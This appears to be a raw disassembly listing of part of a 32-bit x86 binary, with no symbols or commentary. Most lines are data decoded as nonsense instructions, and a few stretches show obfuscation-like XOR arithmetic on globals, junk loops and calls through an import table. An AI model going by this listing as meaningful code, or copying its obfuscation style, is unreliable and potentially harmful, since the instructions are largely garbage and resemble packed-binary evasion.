  4030e7:	mov    edx,0x92444dd
  4030ec:	push   edi
  4030ed:	imul   edx,DWORD PTR [ecx-0x441cbf5f],0xffffffe9
  4030f4:	sbb    bl,ch
  4030f6:	call   0xac96:0x7bff3ecd
  4030fd:	cld    
  4030fe:	jl     0x403096
  403100:	inc    edi
  403101:	hlt    
  403102:	and    edi,esp
  403104:	dec    edx
  403105:	out    0xd,al
  403107:	(bad)  
  403108:	mov    ebx,0x2a71e09d
  40310d:	push   ebx
  40310e:	and    DWORD PTR [esi],eax
  403110:	neg    DWORD PTR [edx+0x54]
  403113:	ins    BYTE PTR es:[edi],dx
  403114:	stos   BYTE PTR es:[edi],al
  403115:	out    0x18,al
  403117:	adc    esp,DWORD PTR [esi]
  403119:	and    bh,BYTE PTR [ebx+0x2f]
  40311c:	add    ax,0x1cc6
  403120:	das    
  403121:	rcr    BYTE PTR [esi],0x94
  403124:	mov    edi,0xb3b2cd72
  403129:	shr    DWORD PTR [ecx-0x3e],cl
  40312c:	xor    BYTE PTR [eax+0x1affda3c],bl
  403132:	xchg   ebp,eax
  403133:	enter  0x216a,0x4c
  403137:	or     esi,DWORD PTR [edi+0x71558f8c]
  40313d:	iret   
  40313e:	pop    esi
  40313f:	add    ebx,DWORD PTR [edx+eiz*1-0x58]
  403143:	shl    DWORD PTR [ebx-0x11],1
  403146:	adc    al,0x76
  403148:	jo     0x4031b7
  40314a:	inc    ebp
  40314b:	idiv   dh
  40314d:	fwait
  40314e:	pop    esi
  40314f:	fld    TBYTE PTR [esi-0x11294072]
  403155:	jmp    0x4031ae
  403157:	sbb    al,0x26
  403159:	ss mov edx,0xfcee5cbc
  40315f:	(bad)  
  403160:	shr    ebp,0x50
  403163:	mov    eax,0x7a42059f
  403168:	or     ebx,DWORD PTR [edx]
  40316a:	ins    BYTE PTR es:[edi],dx
  40316b:	(bad)  
  40316c:	mov    eax,0x3ba0cef2
  403171:	pop    ebp
  403172:	repnz or eax,0xbb509313
  403178:	ficomp DWORD PTR [esi-0x40]
  40317b:	cmp    al,0x49
  40317d:	pop    ebx
  40317e:	sub    DWORD PTR [ebx+eiz*2-0x365781a9],ecx
  403185:	mov    BYTE PTR [esi-0x35],bh
  403188:	stc    
  403189:	int3   
  40318a:	fdiv   DWORD PTR [esi+0x7e]
  40318d:	test   al,0x97
  40318f:	cmp    eax,0x4ab70505
  403194:	push   cs
  403195:	repnz std 
  403197:	sbb    al,0x83
  403199:	jo     0x4031cd
  40319b:	pop    ss
  40319c:	in     al,0x4c
  40319e:	mov    ds:0xc86953b1,al
  4031a3:	dec    eax
  4031a4:	inc    ecx
  4031a5:	dec    ecx
  4031a6:	test   al,0xaf
  4031a8:	inc    eax
  4031a9:	or     al,0x6d
  4031ab:	cdq    
  4031ac:	dec    ecx
  4031ad:	inc    ecx
  4031ae:	shr    cl,1
  4031b0:	stos   DWORD PTR es:[edi],eax
  4031b1:	loopne 0x403181
  4031b3:	sbb    edi,DWORD PTR [ebx+ecx*4]
  4031b6:	sahf   
  4031b7:	sar    BYTE PTR [edi],cl
  4031b9:	add    esi,DWORD PTR [ecx+0x3afdafcb]
  4031bf:	add    eax,0x523652cc
  4031c4:	lock xchg ebp,eax
  4031c6:	mov    WORD PTR [esi],ss
  4031c8:	xchg   esi,eax
  4031c9:	push   es
  4031ca:	int    0xc5
  4031cc:	call   0x3fc5:0xea700ff0
  4031d3:	jne    0x40316d
  4031d5:	in     al,0x1f
  4031d7:	xchg   DWORD PTR [edi],edi
  4031d9:	pop    ds
  4031da:	scas   eax,DWORD PTR es:[edi]
  4031db:	xor    BYTE PTR [ebp+0x1ffe52a8],0xd7
  4031e2:	sti    
  4031e3:	cmp    DWORD PTR [edi],0x27
  4031e6:	div    BYTE PTR [edi]
  4031e8:	pop    ss
  4031e9:	sbb    DWORD PTR [ebx-0x39e133c2],esi
  4031ef:	sub    eax,0x9f228c19
  4031f4:	adc    ecx,DWORD PTR [edx+edi*8-0x4b95ced6]
  4031fb:	xchg   ebx,eax
  4031fc:	pushf  
  4031fd:	pop    ss
  4031fe:	inc    ebx
  4031ff:	xchg   ecx,eax
  403200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403201:	shl    DWORD PTR [esi+ebx*2+0x221311dc],0x4f
  403209:	jne    0x403204
  40320b:	and    BYTE PTR [ebx-0x62f16935],ah
  403211:	scas   eax,DWORD PTR es:[edi]
  403212:	cmp    al,0xc2
  403214:	push   ebx
  403215:	fs iret 
  403217:	mov    ebp,0x5e09bf29
  40321c:	dec    esi
  40321d:	lock mov al,0x9b
  403220:	and    bh,BYTE PTR [ecx+eiz*8-0x5]
  403224:	stos   DWORD PTR es:[edi],eax
  403225:	and    al,0xb6
  403227:	and    esp,DWORD PTR [ecx]
  403229:	lods   eax,DWORD PTR ds:[esi]
  40322a:	pusha  
  40322b:	fdivr  DWORD PTR [eax]
  40322d:	jb     0x4031b6
  40322f:	inc    esi
  403230:	mov    ah,0xb5
  403232:	mov    al,dl
  403234:	mov    DWORD PTR [ecx],edx
  403236:	or     bl,BYTE PTR [eax+ebx*2+0x74]
  40323a:	aad    0x47
  40323c:	dec    esi
  40323d:	cmc    
  40323e:	adc    ah,dh
  403240:	push   cs
  403241:	xchg   esp,eax
  403242:	std    
  403243:	add    esi,edx
  403245:	retf   
  403246:	xor    al,0x15
  403248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403249:	stos   BYTE PTR es:[edi],al
  40324a:	jbe    0x4032af
  40324c:	push   ss
  40324d:	jp     0x4032c3
  40324f:	dec    ecx
  403250:	and    esp,edx
  403252:	dec    ecx
  403253:	cmp    eax,DWORD PTR [ebx+0x57]
  403256:	inc    esi
  403257:	or     ecx,DWORD PTR [edx-0x22883a86]
  40325d:	mov    edx,0x8cad51ec
  403262:	ret    
  403263:	fld    DWORD PTR fs:[esi]
  403266:	mov    ds:0x34146553,eax
  40326b:	jnp    0x40322a
  40326d:	leave  
  40326e:	xchg   ebp,eax
  40326f:	ins    BYTE PTR es:[edi],dx
  403270:	or     BYTE PTR [esp+ebx*4-0x47763568],ah
  403277:	cmp    BYTE PTR [edx+0x33660000],cl
  40327d:	inc    ecx
  40327e:	and    BYTE PTR [ecx+0x3afe],bh
  403284:	and    DWORD PTR ds:0x4344fb,0x4344c3
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43450f
  403297:	xor    ecx,DWORD PTR ds:0x43446b
  40329d:	mov    DWORD PTR ds:0x43450f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x4344ff
  4032ac:	xor    DWORD PTR ds:0x434483,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43450f
  4032bb:	sbb    ecx,DWORD PTR ds:0x43453f
  4032c1:	mov    DWORD PTR ds:0x43450f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43450f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43458b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     ah,BYTE PTR [ebp+0x6a]
  4032f4:	je     0x403350
  4032f6:	or     edx,DWORD PTR [eax]
  4032f8:	jle    0x403378
  4032fa:	push   esi
  4032fb:	jns    0x40337b
  4032fd:	jle    0x403378
  4032ff:	(bad)  
  403300:	mov    dl,BYTE PTR ds:0xd75362c
  403306:	lahf   
  403307:	mov    dh,0x65
  403309:	mov    dl,0x97
  40330b:	inc    eax
  40330c:	(bad)  
  40330d:	adc    ah,cl
  40330f:	xchg   ebx,eax
  403310:	jb     0x403365
  403312:	or     DWORD PTR [edi],edx
  403314:	les    esp,FWORD PTR [edi-0x57]
  403317:	sbb    al,0xc
  403319:	xor    ebx,ebx
  40331b:	(bad)  
  40331c:	pop    ss
  40331d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40331e:	div    BYTE PTR [eax+ebp*1-0x79196ca4]
  403325:	cli    
  403326:	mov    edx,0x246a1262
  40332b:	push   cs
  40332c:	push   0x96dcb06e
  403331:	imul   esi,DWORD PTR [edx+ebp*8-0x66],0xe9eb5d8c
  403339:	jmp    0xa71d:0x57811ae
  403340:	pop    esi
  403341:	ror    DWORD PTR [eax-0x25],cl
  403344:	out    dx,al
  403345:	gs or  bl,bh
  403348:	test   eax,0x1d6b6e58
  40334d:	xor    BYTE PTR [edi-0x51],ah
  403350:	pop    edi
  403351:	jg     0x403389
  403353:	out    0x4d,al
  403355:	pusha  
  403356:	pop    ds
  403357:	mov    edi,0x10babd67
  40335c:	ja     0x40337d
  40335e:	xchg   ebx,eax
  40335f:	sar    BYTE PTR [ebp+0x2279282b],1
  403365:	or     esp,DWORD PTR [ebp+0x2b]
  403368:	daa    
  403369:	dec    ebx
  40336a:	jns    0x40339c
  40336c:	inc    esp
  40336d:	(bad)  
  40336f:	add    ah,BYTE PTR [esi]
  403371:	push   ebp
  403372:	sub    eax,0x9b9a8753
  403377:	jmp    0x4a4e:0x2a687574
  40337e:	loope  0x4033b3
  403380:	pop    ebp
  403381:	adc    dl,BYTE PTR [edi]
  403383:	fisubr DWORD PTR [edx-0x1cc5c127]
  403389:	adc    BYTE PTR [ebp+0x7b16842b],ch
  40338f:	hlt    
  403390:	dec    ebx
  403391:	in     eax,dx
  403392:	mov    eax,DWORD PTR [ebp+0x30fad518]
  403398:	clc    
  403399:	sahf   
  40339a:	in     eax,0xfe
  40339c:	in     eax,0x4b
  40339e:	fcmovne st,st(6)
  4033a0:	out    0x70,al
  4033a2:	gs aad 0x49
  4033a5:	sub    eax,0x33506677
  4033aa:	mov    edx,0x634c4c50
  4033af:	ror    ah,1
  4033b1:	and    ecx,edx
  4033b3:	sbb    esp,0xffffffea
  4033b6:	xchg   ecx,eax
  4033b7:	sbb    BYTE PTR [ebx-0x5f42d221],bh
  4033bd:	push   ebp
  4033be:	and    cl,BYTE PTR [ebx-0x1c]
  4033c1:	add    ah,al
  4033c3:	fcom   DWORD PTR [eax+0x15]
  4033c6:	retf   
  4033c7:	pushf  
  4033c8:	retf   0xca41
  4033cb:	dec    edi
  4033cc:	in     eax,dx
  4033cd:	adc    al,0x47
  4033cf:	outs   dx,DWORD PTR ds:[esi]
  4033d0:	sub    DWORD PTR [ecx+0x42787006],edi
  4033d6:	lock push ds
  4033d8:	lock sbb ecx,DWORD PTR [esi-0x33]
  4033dc:	out    dx,al
  4033dd:	xchg   BYTE PTR [ecx+eiz*8-0xd],bh
  4033e1:	pop    ds
  4033e2:	jae    0x403430
  4033e4:	dec    edi
  4033e5:	pop    es
  4033e6:	cli    
  4033e7:	retf   0xa7bb
  4033ea:	repnz outs dx,DWORD PTR ds:[esi]
  4033ec:	lds    edx,FWORD PTR [edi+0xdaa8ab6]
  4033f2:	cmp    bh,dl
  4033f4:	fimul  DWORD PTR [ebx-0x1550fde9]
  4033fa:	nop
  4033fb:	mov    bl,0x19
  4033fd:	shr    ebx,cl
  4033ff:	xor    al,0x19
  403401:	dec    edi
  403402:	shr    DWORD PTR [esp+ebx*2-0x7f0aeaad],cl
  403409:	fisttp DWORD PTR ds:0x2452ab95
  40340f:	lea    ebx,[ebp-0x7a80dec4]
  403415:	dec    esp
  403416:	cmp    ebx,edi
  403418:	push   ds
  403419:	cs xchg esp,eax
  40341b:	pushf  
  40341c:	(bad)  
  40341d:	add    BYTE PTR [bx+di-0x352c],bh
  403422:	ret    0xe56e
  403425:	or     al,0xf5
  403427:	and    eax,0x62739387
  40342c:	loopne 0x403409
  40342e:	cmp    BYTE PTR [esi-0x45],al
  403431:	mov    ecx,0xa436b2d8
  403436:	(bad)  
  403437:	ss stos BYTE PTR es:[edi],al
  403439:	and    al,BYTE PTR [edx+ebp*2-0x5ca21616]
  403440:	cdq    
  403441:	lock sub bl,ch
  403444:	pop    ebx
  403445:	enter  0x5605,0xa7
  403449:	mov    WORD PTR [ebx],ss
  40344b:	icebp  
  40344c:	cli    
  40344d:	sbb    eax,0xdc0bf95
  403452:	lds    edx,FWORD PTR [ebp-0x2b]
  403455:	mov    ah,0xc
  403457:	fs iret 
  403459:	sar    BYTE PTR [eax-0x51],1
  40345c:	mov    bl,0x26
  40345e:	out    dx,al
  40345f:	lock stos DWORD PTR es:[edi],eax
  403461:	in     eax,0xd4
  403463:	sbb    eax,0x46cb569c
  403468:	mov    edi,0xa63c85b3
  40346d:	jle    0x40347c
  40346f:	retf   
  403470:	cmp    esp,esp
  403472:	push   esi
  403473:	inc    edi
  403474:	mov    eax,ds:0x907eb7ea
  403479:	jns    0x4034df
  40347b:	dec    ebp
  40347c:	push   ebp
  40347d:	xchg   ebx,eax
  40347e:	loopne 0x4034ca
  403480:	into   
  403481:	retf   
  403482:	jbe    0x403477
  403484:	jmp    0xb3cf:0xcd618e6b
  40348b:	add    dl,bh
  40348d:	cmp    eax,0xfa46d3cb
  403492:	pusha  
  403493:	ror    ebx,cl
  403495:	iret   
  403496:	cli    
  403497:	xlat   BYTE PTR ds:[ebx]
  403498:	ror    ah,1
  40349a:	outs   dx,DWORD PTR ds:[esi]
  40349b:	lods   eax,DWORD PTR ds:[esi]
  40349c:	cmp    dl,BYTE PTR [eax]
  40349e:	push   ss
  40349f:	loop   0x4034e4
  4034a1:	mov    edx,0xb9c70550
  4034a6:	retf   0xb99b
  4034a9:	pop    ebp
  4034aa:	les    ebp,FWORD PTR fs:[esi+eax*4+0x41]
  4034af:	jl     0x403488
  4034b1:	retf   
  4034b2:	loop   0x403452
  4034b4:	cmp    esi,ebx
  4034b6:	dec    esp
  4034b7:	adc    dl,dl
  4034b9:	ins    DWORD PTR es:[edi],dx
  4034ba:	loope  0x4034ad
  4034bc:	xlat   BYTE PTR ds:[ebx]
  4034bd:	pop    ebp
  4034be:	mov    al,ds:0x2ffcc8b6
  4034c3:	add    BYTE PTR cs:[ecx-0x757c025d],al
  4034ca:	sub    eax,0xcf2ebd6f
  4034cf:	sub    ebp,edx
  4034d1:	cmp    DWORD PTR [edx+0x28],0x416a50af
  4034d8:	jno    0x403551
  4034da:	sub    DWORD PTR [ebx],edx
  4034dc:	mov    bh,BYTE PTR [esi+0x2e]
  4034df:	loop   0x403536
  4034e1:	pop    eax
  4034e2:	rol    ch,cl
  4034e4:	(bad)  
  4034e5:	(bad)  
  4034e6:	div    BYTE PTR [ecx-0x20b42229]
  4034ec:	std    
  4034ed:	ss cmp ah,BYTE PTR ss:[edx-0x6f2d21a9]
  4034f5:	cmp    eax,0x3a39d011
  4034fa:	addr16 repz mov cl,0xc1
  4034fe:	retf   0xab47
  403501:	adc    ecx,DWORD PTR [ecx+ebp*4]
  403504:	jo     0x403523
  403506:	xchg   BYTE PTR [ecx+0x3ec73c43],dl
  40350c:	loope  0x40356a
  40350e:	addr16 cmp al,0x4f
  403511:	(bad)  
  403512:	mov    ds:0x322d8461,eax
  403517:	adc    DWORD PTR [esi-0x72],ecx
  40351a:	xchg   ecx,eax
  40351b:	fnsave [esi-0x24]
  40351e:	and    eax,0x6cbf5019
  403523:	jbe    0x4034bf
  403525:	imul   edx,ecx,0x2d
  403528:	pop    edx
  403529:	jg     0x4034ab
  40352b:	call   0x6c1c7979
  403530:	shr    DWORD PTR [edx-0x29],cl
  403533:	mov    bh,0x43
  403535:	hlt    
  403536:	add    al,0x13
  403538:	stc    
  403539:	pusha  
  40353a:	mov    ?,ebx
  40353c:	aad    0x47
  40353e:	sub    al,0x7
  403540:	sbb    DWORD PTR [eax+0x5a],ebx
  403543:	sbb    al,0x32
  403545:	xor    BYTE PTR [eax+0x36],cl
  403548:	pop    eax
  403549:	scas   al,BYTE PTR es:[edi]
  40354a:	and    esi,DWORD PTR [eax-0x11eb14ad]
  403550:	mov    es,WORD PTR [esi]
  403552:	in     al,0x8f
  403554:	add    eax,0x6141e430
  403559:	add    ah,bh
  40355b:	cld    
  40355c:	cmp    al,0x24
  40355e:	mov    ds:0xfd4623a7,eax
  403563:	leave  
  403564:	push   esp
  403565:	jns    0x40359d
  403567:	dec    esp
  403568:	retf   0xdc46
  40356b:	bound  ecx,QWORD PTR [eax-0x68e9960e]
  403571:	xor    eax,0x864f227a
  403576:	and    al,0x59
  403578:	bound  ebx,QWORD PTR [esp+ebp*2]
  40357b:	xchg   ebx,eax
  40357c:	fdivr  st(4),st
  40357e:	test   eax,0x121b8bd
  403583:	add    bl,BYTE PTR [ecx-0x331a702c]
  403589:	and    al,0xd9
  40358b:	aas    
  40358c:	fisttp DWORD PTR [ebx]
  40358e:	shl    BYTE PTR [edx+0x35],0x13
  403592:	jge    0x4035cc
  403594:	mov    edx,0xb4aef9b8
  403599:	jae    0x4035df
  40359b:	(bad)  
  40359c:	fwait
  40359d:	cdq    
  40359e:	xor    ebp,edi
  4035a0:	jnp    0x40359e
  4035a2:	ror    cl,cl
  4035a4:	pop    esi
  4035a5:	sbb    al,0xec
  4035a7:	inc    ecx
  4035a8:	or     cl,BYTE PTR [ecx-0x6d]
  4035ab:	fbld   TBYTE PTR [ebp-0x77]
  4035ae:	mov    edx,0x4e81c918
  4035b3:	sar    DWORD PTR [ebx-0x61],cl
  4035b6:	xchg   edi,eax
  4035b7:	retf   0x953e
  4035ba:	sbb    edx,ebx
  4035bc:	jle    0x4035ad
  4035be:	rcr    BYTE PTR [ecx-0x758ace79],0x8a
  4035c5:	mov    ebx,0x23e1c159
  4035ca:	adc    DWORD PTR [edi+0x50],ecx
  4035cd:	jnp    0x403584
  4035cf:	jmp    0xfbf1b871
  4035d4:	and    BYTE PTR [eax+0x1301b2c6],0xdb
  4035db:	icebp  
  4035dc:	push   edi
  4035dd:	xchg   edx,eax
  4035de:	mov    bh,0x9d
  4035e0:	jbe    0x403639
  4035e2:	test   DWORD PTR [edx],ecx
  4035e4:	push   ebp
  4035e5:	cli    
  4035e6:	jb     0x4035e1
  4035e8:	cwde   
  4035e9:	jae    0x403633
  4035eb:	xor    al,0xb4
  4035ed:	out    dx,eax
  4035ee:	add    eax,0x4c4e6403
  4035f3:	lahf   
  4035f4:	repnz xor dh,BYTE PTR [ecx+ebx*2]
  4035f8:	cs pop ebx
  4035fa:	xchg   DWORD PTR [edi-0x41b31cdb],edi
  403600:	loopne 0x4035bc
  403602:	add    ebx,eax
  403604:	dec    edi
  403605:	sbb    cl,al
  403607:	mov    eax,0xa17ddde3
  40360c:	repnz dec eax
  40360e:	xor    DWORD PTR [esi+esi*4],esi
  403611:	imul   eax,DWORD PTR [ecx],0xffffffe5
  403614:	and    eax,0xba0e5884
  403619:	pop    esp
  40361a:	dec    ecx
  40361b:	loop   0x4035a9
  40361d:	jne    0x403672
  40361f:	mov    ah,0xc6
  403621:	xor    bh,BYTE PTR [esi+0x47]
  403624:	cwde   
  403625:	cmc    
  403626:	dec    edx
  403627:	shr    DWORD PTR [edi+0x3d],0x4b
  40362b:	lahf   
  40362c:	push   edi
  40362d:	cmp    dh,bl
  40362f:	nop
  403630:	nop
  403631:	(bad)  
  403632:	jmp    0x5457:0x31569f5b
  403639:	add    edx,esi
  40363b:	xchg   ebx,eax
  40363c:	scas   al,BYTE PTR es:[edi]
  40363d:	mov    ecx,0x9a17920f
  403642:	test   BYTE PTR [eax+0xb],bl
  403645:	cmp    al,0xd6
  403647:	cmp    eax,0xfd0a2f48
  40364c:	mov    cl,0x54
  40364e:	fwait
  40364f:	out    dx,al
  403650:	daa    
  403651:	pop    ecx
  403652:	jne    0x4035f9
  403654:	mov    eax,ds:0x8084bad
  403659:	int3   
  40365a:	xor    eax,0x3664f6ff
  40365f:	pop    esi
  403660:	scas   eax,DWORD PTR es:[edi]
  403661:	xchg   al,dh
  403663:	inc    ebp
  403664:	inc    ebx
  403665:	dec    ecx
  403666:	repz pushf 
  403668:	out    dx,al
  403669:	lods   eax,DWORD PTR ds:[esi]
  40366a:	rcl    eax,0x3c
  40366d:	sub    eax,0x2a89f5d0
  403672:	push   ds
  403673:	pop    eax
  403674:	sub    DWORD PTR [eax+0x3],ebx
  403677:	inc    edx
  403678:	sar    cl,cl
  40367a:	shr    DWORD PTR [edi+0x17d52d20],cl
  403680:	mov    ah,0xbe
  403682:	icebp  
  403683:	pop    esp
  403684:	jb     0x40368f
  403686:	fstp   TBYTE PTR [edx+esi*4+0x1d]
  40368a:	sub    al,0xf5
  40368c:	mov    bl,0xdd
  40368e:	dec    esi
  40368f:	inc    BYTE PTR [edi]
  403691:	push   0xffffffad
  403693:	ficom  DWORD PTR ds:0xff6c3b0a
  403699:	das    
  40369a:	icebp  
  40369b:	enter  0x6a9f,0xdc
  40369f:	or     eax,0xc63b202f
  4036a4:	sbb    eax,0xc1d3d951
  4036a9:	call   0x96ba:0x435f9e98
  4036b0:	(bad)  
  4036b1:	jle    0x40371f
  4036b3:	int3   
  4036b4:	fcomp  QWORD PTR [edx]
  4036b6:	push   es
  4036b7:	addr16 mov ch,0x2b
  4036ba:	hlt    
  4036bb:	push   DWORD PTR [edx-0x2a]
  4036be:	mov    al,0x30
  4036c0:	push   esi
  4036c1:	mov    edx,DWORD PTR [ebx+0x3ad1f1c]
  4036c7:	pop    ss
  4036c8:	(bad)  
  4036c9:	aaa    
  4036ca:	xchg   DWORD PTR [ecx],edi
  4036cc:	xchg   edi,esi
  4036ce:	test   al,0x1
  4036d0:	or     bl,ah
  4036d2:	outs   dx,BYTE PTR ds:[esi]
  4036d3:	pop    ecx
  4036d4:	ins    BYTE PTR es:[edi],dx
  4036d5:	mov    ds:0x8bff458a,eax
  4036da:	or     eax,0x43446b
  4036df:	sbb    ecx,DWORD PTR ds:0x434587
  4036e5:	mov    DWORD PTR ds:0x43446b,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434593,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x43447b,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x434477,0x434587
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x4344f7,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434507,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434507
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434507,ecx
  40373d:	cmp    DWORD PTR ds:0x434507,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434507,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x43454b,0x14
  403779:	cmp    DWORD PTR ds:0x43454b,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x43454b,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x43454b,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x43454b
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x43454b,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x43454b
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x43454b,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x434467,0x1c
  4037dc:	cmp    DWORD PTR ds:0x434467,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x434467,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x4346c9
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x434467,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x434467
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x434467,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x434467
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x434467,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434507,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43458b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x4344cf,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x4344c3
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x4344cb,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	jns    0x403915
  4038bf:	mov    ch,0x4d
  4038c1:	arpl   WORD PTR [ebx],dx
  4038c3:	jle    0x403943
  4038c5:	push   esi
  4038c6:	jns    0x403946
  4038c8:	jle    0x403862
  4038ca:	pushf  
  4038cb:	push   ds
  4038cc:	pop    edi
  4038cd:	dec    ecx
  4038ce:	leave  
  4038cf:	rol    DWORD PTR [eax],0xf2
  4038d2:	in     al,dx
  4038d3:	sahf   
  4038d4:	xchg   esp,eax
  4038d5:	or     eax,0xf7d81702
  4038da:	nop
  4038db:	(bad)  
  4038dc:	enter  0xdc16,0x9c
  4038e0:	out    dx,eax
  4038e1:	jmp    0x68349b40
  4038e6:	pop    edi
  4038e7:	into   
  4038e8:	std    
  4038e9:	mov    esp,ebp
  4038eb:	cwde   
  4038ec:	fnstsw WORD PTR [edx-0xd]
  4038ef:	mov    al,0xc8
  4038f1:	leave  
  4038f2:	sbb    BYTE PTR [ecx],bl
  4038f4:	stc    
  4038f5:	jg     0x403881
  4038f7:	test   eax,0xc7ed9e42
  4038fc:	push   es
  4038fd:	adc    eax,0x1b469916
  403902:	retf   
  403903:	sbb    al,0xc8
  403905:	inc    DWORD PTR [edx]
  403907:	lock add esi,DWORD PTR [edi-0x70f97fe]
  40390e:	push   ebx
  40390f:	hlt    
  403910:	data16 ror ah,0x39
  403914:	mov    dl,0xfe
  403916:	xor    DWORD PTR [ecx-0x5f],esi
  403919:	inc    edx
  40391a:	inc    esp
  40391b:	retf   
  40391c:	push   ebx
  40391d:	add    ecx,DWORD PTR [ebp+0x37]
  403920:	bound  eax,QWORD PTR [edi+0x122e7884]
  403926:	scas   eax,DWORD PTR es:[edi]
  403927:	mov    edx,0xd76c2d17
  40392c:	imul   edi,DWORD PTR [esi-0x47],0xffffffb8
  403930:	xchg   BYTE PTR [ebx+ebx*2],ch
  403933:	add    eax,0x618ed701
  403938:	and    esi,esi
  40393a:	cmp    eax,0x146877b3
  40393f:	sbb    eax,ebx
  403941:	addr16 popa 
  403943:	jmp    0xf03c:0x717423c5
  40394a:	popf   
  40394b:	int    0xd9
  40394d:	aad    0x98
  40394f:	inc    edx
  403950:	cs cdq 
  403952:	into   
  403953:	retf   
  403954:	inc    edx
  403955:	push   esp
  403956:	loop   0x40390c
  403958:	out    dx,eax
  403959:	cmp    eax,0x2bfbae4b
  40395e:	out    0x90,eax
  403960:	mov    al,0x7b
  403962:	mov    ah,0xaa
  403964:	loop   0x403956
  403966:	std    
  403967:	sub    BYTE PTR [ebx-0x40a4f3b7],0x9c
  40396e:	mov    ds,WORD PTR [edx]
  403970:	jecxz  0x403960
  403972:	adc    eax,DWORD PTR [ebx]
  403974:	jno    0x40391f
  403976:	mov    bl,0x4a
  403978:	(bad)  
  403979:	fnstenv [ebx]
  40397b:	xchg   BYTE PTR [edx+0x44],bh
  40397e:	and    ch,BYTE PTR [esi+ebp*2]
  403981:	mov    dl,0x8c
  403983:	lods   al,BYTE PTR ds:[esi]
  403984:	inc    ecx
  403985:	sub    eax,DWORD PTR [ebx]
  403987:	dec    ebp
  403988:	addr16 addr16 call 0xaed7:0x4d756801
  403991:	and    al,0x23
  403993:	jg     0x40395e
  403995:	fs enter 0x899c,0xd
  40399a:	inc    esi
  40399b:	aad    0x19
  40399d:	mov    cl,0xa6
  40399f:	inc    edx
  4039a0:	hlt    
  4039a1:	fcmovne st,st(3)
  4039a3:	out    0xb4,al
  4039a5:	dec    eax
  4039a6:	and    DWORD PTR [ecx+0x1d09f263],0xb3354947
  4039b0:	retf   
  4039b1:	mov    cl,0xa
  4039b3:	stc    
  4039b4:	dec    edx
  4039b5:	pop    ecx
  4039b6:	pop    eax
  4039b7:	inc    edi
